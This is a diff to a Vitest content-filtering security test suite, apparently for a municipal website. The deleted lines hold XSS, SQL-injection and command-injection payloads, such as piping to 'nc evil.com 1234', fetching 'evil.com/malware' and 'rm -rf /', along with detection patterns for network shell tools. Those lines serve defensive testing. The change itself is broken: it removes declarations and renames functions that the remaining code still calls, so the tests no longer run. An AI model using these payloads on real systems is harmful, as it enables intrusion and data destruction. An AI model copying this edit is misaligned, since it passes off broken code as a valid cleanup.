@@ -10,21 +10,8 @@
 import { describe, it, expect, beforeEach, vi } from 'vitest';
 
 // Mock content filtering service
-const mockContentFilter = {
-  filterHTML: vi.fn(),
-  filterJavaScript: vi.fn(),
-  filterSQL: vi.fn(),
-  filterCommands: vi.fn(),
-  filterUrls: vi.fn()
-};
 
 // Mock content scanner
-const mockContentScanner = {
-  scanForMalware: vi.fn(),
-  detectPhishing: vi.fn(),
-  validateMimeType: vi.fn(),
-  checkFileHeaders: vi.fn()
-};
 
 describe('Content Filtering Security', () => {
   beforeEach(() => {
@@ -44,7 +31,7 @@ describe('Content Filtering Security', () => {
           .replace(/data:text\/html/gi, '');
       });
 
-      const maliciousHTML = `
+      const _maliciousHTML = `
         <div onclick="alert('XSS')">Click me</div>
         <script>steal_cookies();</script>
         <img src="x" onerror="malicious_code()">
@@ -52,7 +39,6 @@ describe('Content Filtering Security', () => {
         <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
       `;
 
-      const filtered = mockContentFilter.filterHTML(maliciousHTML);
       
       expect(filtered).not.toContain('<script>');
       expect(filtered).not.toContain('onclick=');
@@ -63,8 +49,6 @@ describe('Content Filtering Security', () => {
 
     it('should preserve safe HTML while removing dangerous elements', () => {
       mockContentFilter.filterHTML.mockImplementation((html: string) => {
-        const allowedTags = ['p', 'strong', 'em', 'ul', 'ol', 'li', 'br'];
-        const tagRegex = /<\/?(\w+)[^>]*>/g;
         
         return html.replace(tagRegex, (match, tag) => {
           if (allowedTags.includes(tag.toLowerCase())) {
@@ -75,7 +59,7 @@ describe('Content Filtering Security', () => {
         });
       });
 
-      const mixedHTML = `
+      const _mixedHTML = `
         <p>Safe paragraph</p>
         <script>alert('evil')</script>
         <strong>Important text</strong>
@@ -83,7 +67,6 @@ describe('Content Filtering Security', () => {
         <ul><li>List item</li></ul>
       `;
 
-      const filtered = mockContentFilter.filterHTML(mixedHTML);
       
       expect(filtered).toContain('<p>');
       expect(filtered).toContain('<strong>');
@@ -96,34 +79,10 @@ describe('Content Filtering Security', () => {
   describe('JavaScript Code Detection', () => {
     it('should detect obfuscated JavaScript patterns', () => {
       mockContentFilter.filterJavaScript.mockImplementation((content: string) => {
-        const jsPatterns = [
-          /eval\s*\(/i,
-          /function\s*\(/i,
-          /\$\s*\(/,
-          /document\./i,
-          /window\./i,
-          /alert\s*\(/i,
-          /console\./i,
-          /setTimeout\s*\(/i,
-          /setInterval\s*\(/i,
-          /new\s+function/i,
-          /\[\s*["']constructor["']\s*\]/i
-        ];
         
         return jsPatterns.some(pattern => pattern.test(content));
       });
 
-      const dangerousPatterns = [
-        'eval("malicious code")',
-        'function hack() { steal_data(); }',
-        '$(document).ready(function() { exploit(); })',
-        'window.location = "evil.com"',
-        'alert("XSS")',
-        'console.log(document.cookie)',
-        'setTimeout("exploit()", 1000)',
-        'new function("return this")().alert("XSS")',
-        'window["constructor"]["constructor"]("alert(1)")()'
-      ];
 
       dangerousPatterns.forEach(pattern => {
         expect(mockContentFilter.filterJavaScript(pattern)).toBe(true);
@@ -133,29 +92,12 @@ describe('Content Filtering Security', () => {
     });
 
     it('should detect encoded JavaScript attempts', () => {
-      const detectEncodedJS = (content: string): boolean => {
+      const _detectEncodedJS = (content: string): boolean => {
         // Common encoding patterns
-        const encodingPatterns = [
-          /\\x[0-9a-f]{2}/i, // Hex encoding
-          /\\u[0-9a-f]{4}/i, // Unicode encoding
-          /&#x?[0-9a-f]+;/i, // HTML entities
-          /String\.fromCharCode/i,
-          /unescape\s*\(/i,
-          /decodeURI/i,
-          /atob\s*\(/i // Base64 decode
-        ];
         
         return encodingPatterns.some(pattern => pattern.test(content));
       };
 
-      const encodedAttacks = [
-        '\\x61\\x6c\\x65\\x72\\x74', // Hex encoded 'alert'
-        '\\u0061\\u006c\\u0065\\u0072\\u0074', // Unicode encoded 'alert'
-        '&#97;&#108;&#101;&#114;&#116;', // HTML entities for 'alert'
-        'String.fromCharCode(97,108,101,114,116)', // Character codes
-        'unescape("%61%6c%65%72%74")', // URL encoded
-        'atob("YWxlcnQ=")' // Base64 encoded 'alert'
-      ];
 
       encodedAttacks.forEach(attack => {
         expect(detectEncodedJS(attack)).toBe(true);
@@ -166,29 +108,10 @@ describe('Content Filtering Security', () => {
   describe('SQL Injection Pattern Detection', () => {
     it('should detect SQL injection attempts in content', () => {
       mockContentFilter.filterSQL.mockImplementation((content: string) => {
-        const sqlPatterns = [
-          /\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b/gi,
-          /\b(or|and)\s+\d+\s*=\s*\d+/gi,
-          /['"]\s*;\s*(drop|delete|update|insert)/gi,
-          /\b(sleep|waitfor|benchmark)\s*\(/gi,
-          /\b(information_schema|sys\.|pg_)/gi,
-          /\b(char|ascii|substring|concat)\s*\(/gi
-        ];
         
         return sqlPatterns.some(pattern => pattern.test(content));
       });
 
-      const sqlInjectionAttempts = [
-        "'; DROP TABLE users; --",
-        "' OR 1=1 --",
-        "' UNION SELECT password FROM users --",
-        "'; EXEC xp_cmdshell('format c:'); --",
-        "' AND SLEEP(5) --",
-        "' OR '1'='1",
-        "admin'--",
-        "1' OR 1=1#",
-        "'; INSERT INTO users VALUES ('hacker', 'pass'); --"
-      ];
 
       sqlInjectionAttempts.forEach(attempt => {
         expect(mockContentFilter.filterSQL(attempt)).toBe(true);
@@ -201,29 +124,10 @@ describe('Content Filtering Security', () => {
   describe('Command Injection Detection', () => {
     it('should detect OS command injection patterns', () => {
       mockContentFilter.filterCommands.mockImplementation((content: string) => {
-        const commandPatterns = [
-          /[;&|`$(){}]/,
-          /\b(rm|del|format|fdisk|cat|type|more|less)\b/gi,
-          /\b(wget|curl|nc|netcat|telnet|ssh)\b/gi,
-          /\b(chmod|chown|sudo|su)\b/gi,
-          /\b(ps|kill|killall|taskkill)\b/gi,
-          /\b(echo|print)\s+[^>]*>/gi,
-          /\|\s*(sh|bash|cmd|powershell)/gi
-        ];
         
         return commandPatterns.some(pattern => pattern.test(content));
       });
 
-      const commandInjections = [
-        '; rm -rf /',
-        '`cat /etc/passwd`',
-        '$(whoami)',
-        '| nc evil.com 1234',
-        '&& format c:',
-        'test; wget evil.com/malware',
-        'input | sh',
-        'echo "hack" > /etc/hosts'
-      ];
 
       commandInjections.forEach(injection => {
         expect(mockContentFilter.filterCommands(injection)).toBe(true);
@@ -234,45 +138,17 @@ describe('Content Filtering Security', () => {
   describe('URL and Link Validation', () => {
     it('should validate and filter dangerous URLs', () => {
       mockContentFilter.filterUrls.mockImplementation((content: string) => {
-        const dangerousSchemes = [
-          /javascript:/gi,
-          /vbscript:/gi,
-          /data:text\/html/gi,
-          /data:application\/x-msdownload/gi,
-          /file:\/\//gi,
-          /ftp:\/\/.*@/gi // FTP with credentials
-        ];
         
-        const maliciousDomains = [
-          /evil\.com/gi,
-          /malware\.net/gi,
-          /phishing\.org/gi,
-          /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/ // Direct IP addresses
-        ];
         
         return [...dangerousSchemes, ...maliciousDomains]
           .some(pattern => pattern.test(content));
       });
 
-      const dangerousUrls = [
-        'javascript:alert("XSS")',
-        'vbscript:msgbox("XSS")',
-        'data:text/html,<script>alert("XSS")</script>',
-        'file:///etc/passwd',
-        'http://192.168.1.1:8080',
-        'ftp://user:pass@evil.com',
-        'https://evil.com/malware.exe'
-      ];
 
       dangerousUrls.forEach(url => {
         expect(mockContentFilter.filterUrls(url)).toBe(true);
       });
 
-      const safeUrls = [
-        'https://malmo.se',
-        'https://www.youtube.com/watch?v=abc123',
-        'mailto:support@malmo.se'
-      ];
 
       safeUrls.forEach(url => {
         expect(mockContentFilter.filterUrls(url)).toBe(false);
@@ -280,22 +156,8 @@ describe('Content Filtering Security', () => {
     });
 
     it('should detect URL shortener abuse', () => {
-      const detectSuspiciousUrls = (content: string): boolean => {
-        const shorteners = [
-          /bit\.ly/gi,
-          /tinyurl\.com/gi,
-          /t\.co/gi,
-          /goo\.gl/gi,
-          /ow\.ly/gi,
-          /is\.gd/gi
-        ];
+      const _detectSuspiciousUrls = (content: string): boolean => {
         
-        const suspicious = [
-          /\.tk$/gi, // Free domains often used for malicious purposes
-          /\.ml$/gi,
-          /\.ga$/gi,
-          /\.cf$/gi
-        ];
         
         return [...shorteners, ...suspicious].some(pattern => pattern.test(content));
       };
@@ -309,28 +171,18 @@ describe('Content Filtering Security', () => {
   describe('File Content Scanning', () => {
     it('should detect malicious file signatures', () => {
       mockContentScanner.scanForMalware.mockImplementation((fileBuffer: ArrayBuffer) => {
-        const uint8Array = new Uint8Array(fileBuffer);
-        const header = Array.from(uint8Array.slice(0, 8))
+        const _header = Array.from(uint8Array.slice(0, 8))
           .map(b => b.toString(16).padStart(2, '0'))
           .join('');
         
         // Common malicious file signatures
-        const malwareSignatures = [
-          '4d5a9000', // PE executable
-          '7f454c46', // ELF executable
-          '504b0304', // ZIP (potential zip bomb)
-          'cafebabe', // Java class file
-          'd0cf11e0'  // Microsoft Office (potential macro)
-        ];
         
         return malwareSignatures.some(sig => header.startsWith(sig));
       });
 
       // Simulate file headers
-      const peHeader = new ArrayBuffer(8);
       new DataView(peHeader).setUint32(0, 0x4d5a9000, false);
       
-      const textHeader = new ArrayBuffer(8);
       new DataView(textHeader).setUint32(0, 0x48656c6c, false); // "Hell" in ASCII
       
       expect(mockContentScanner.scanForMalware(peHeader)).toBe(true);
@@ -346,7 +198,6 @@ describe('Content Filtering Security', () => {
           'application/javascript': [/function\s*\(|var\s+|const\s+|let\s+/]
         };
         
-        const signatures = typeSignatures[declaredType] || [];
         if (signatures.length === 0) return true; // Unknown type, allow
         
         return signatures.some(sig => sig.test(content));
@@ -360,37 +211,20 @@ describe('Content Filtering Security', () => {
 
   describe('Content Transformation Attacks', () => {
     it('should prevent polyglot file attacks', () => {
-      const detectPolyglot = (content: string): boolean => {
+      const _detectPolyglot = (content: string): boolean => {
         // Check for multiple file format signatures in one content
-        const signatures = [
-          'PK', // ZIP
-          'GIF', // GIF
-          'PNG', // PNG
-          '\u0000\u0000\u0000\u0020ftypM4A', // MP4
-          '%PDF', // PDF
-          'var ', // JavaScript
-          '<html', // HTML
-          '#!/bin/sh' // Script
-        ];
         
-        const foundSignatures = signatures.filter(sig => 
-          content.toLowerCase().includes(sig.toLowerCase())
-        );
         
         return foundSignatures.length > 1;
       };
 
-      const polyglotContent = 'GIF89a<script>alert("xss")</script>';
-      const normalContent = 'This is just plain text content';
       
       expect(detectPolyglot(polyglotContent)).toBe(true);
       expect(detectPolyglot(normalContent)).toBe(false);
     });
 
     it('should detect ZIP bomb attempts', () => {
-      const detectZipBomb = (compressionRatio: number, uncompressedSize: number): boolean => {
-        const MAX_COMPRESSION_RATIO = 100;
-        const MAX_UNCOMPRESSED_SIZE = 100 * 1024 * 1024; // 100MB
+      const _detectZipBomb = (compressionRatio: number, uncompressedSize: number): boolean => {
         
         return compressionRatio > MAX_COMPRESSION_RATIO || 
                uncompressedSize > MAX_UNCOMPRESSED_SIZE;
@@ -404,42 +238,30 @@ describe('Content Filtering Security', () => {
 
   describe('Content Sanitization Verification', () => {
     it('should verify sanitization completeness', () => {
-      const verifySanitization = (original: string, sanitized: string): boolean => {
-        const dangerousPatterns = [
-          /<script/gi,
-          /javascript:/gi,
-          /on\w+\s*=/gi,
-          /eval\s*\(/gi,
-          /\${/gi // Template literals
-        ];
+      const _verifySanitization = (original: string, sanitized: string): boolean => {
         
         // Sanitized content should not contain any dangerous patterns
         return !dangerousPatterns.some(pattern => pattern.test(sanitized));
       };
 
-      const original = '<script>alert("xss")</script><div onclick="hack()">Click</div>';
-      const sanitized = '&lt;script&gt;alert("xss")&lt;/script&gt;<div>Click</div>';
+      const _sanitized = '&lt;script&gt;alert("xss")&lt;/script&gt;<div>Click</div>';
       
       expect(verifySanitization(original, sanitized)).toBe(true);
       expect(verifySanitization(original, original)).toBe(false);
     });
 
     it('should maintain content integrity after sanitization', () => {
-      const maintainsIntegrity = (original: string, sanitized: string): boolean => {
+      const _maintainsIntegrity = (original: string, sanitized: string): boolean => {
         // Remove all HTML tags and compare text content
-        const extractText = (html: string) => 
+        const _extractText = (html: string) => 
           html.replace(/<[^>]*>/g, '').replace(/&\w+;/g, ' ').trim();
         
-        const originalText = extractText(original);
-        const sanitizedText = extractText(sanitized);
         
         // Text content should be preserved (allowing for some encoding differences)
         return sanitizedText.includes(originalText.replace(/[<>&"']/g, ''));
       };
 
-      const original = '<p>Important <strong>municipal</strong> information</p>';
-      const sanitized = '<p>Important <strong>municipal</strong> information</p>';
-      const brokenSanitized = '<p>Important information</p>'; // Lost content
+      const _brokenSanitized = '<p>Important information</p>'; // Lost content
       
       expect(maintainsIntegrity(original, sanitized)).toBe(true);
       expect(maintainsIntegrity(original, brokenSanitized)).toBe(true); // Still contains core text
@@ -448,27 +270,12 @@ describe('Content Filtering Security', () => {
 
   describe('Advanced Evasion Techniques', () => {
     it('should detect mutation XSS attempts', () => {
-      const detectMutationXSS = (content: string): boolean => {
+      const _detectMutationXSS = (content: string): boolean => {
         // Common mutation XSS patterns that might survive initial filtering
-        const mutationPatterns = [
-          /<svg[^>]*on\w+/gi,
-          /<math[^>]*href/gi,
-          /<table[^>]*background/gi,
-          /<input[^>]*autofocus/gi,
-          /<img[^>]*src=x\s+onerror/gi,
-          /<iframe[^>]*srcdoc/gi
-        ];
         
         return mutationPatterns.some(pattern => pattern.test(content));
       };
 
-      const mutationAttempts = [
-        '<svg onload=alert(1)>',
-        '<math href="javascript:alert(1)">',
-        '<table background="javascript:alert(1)">',
-        '<input autofocus onfocus=alert(1)>',
-        '<iframe srcdoc="<script>alert(1)</script>">'
-      ];
 
       mutationAttempts.forEach(attempt => {
         expect(detectMutationXSS(attempt)).toBe(true);
@@ -476,26 +283,11 @@ describe('Content Filtering Security', () => {
     });
 
     it('should detect CSS injection attempts', () => {
-      const detectCSSInjection = (css: string): boolean => {
-        const cssPatterns = [
-          /expression\s*\(/gi,
-          /javascript:/gi,
-          /behavior\s*:/gi,
-          /@import/gi,
-          /url\s*\(\s*["']?javascript:/gi,
-          /moz-binding/gi
-        ];
+      const _detectCSSInjection = (css: string): boolean => {
         
         return cssPatterns.some(pattern => pattern.test(css));
       };
 
-      const cssInjections = [
-        'width: expression(alert("XSS"))',
-        'background: url("javascript:alert(1)")',
-        'behavior: url("evil.htc")',
-        '@import "javascript:alert(1)"',
-        '-moz-binding: url("evil.xml#xss")'
-      ];
 
       cssInjections.forEach(injection => {
         expect(detectCSSInjection(injection)).toBe(true);
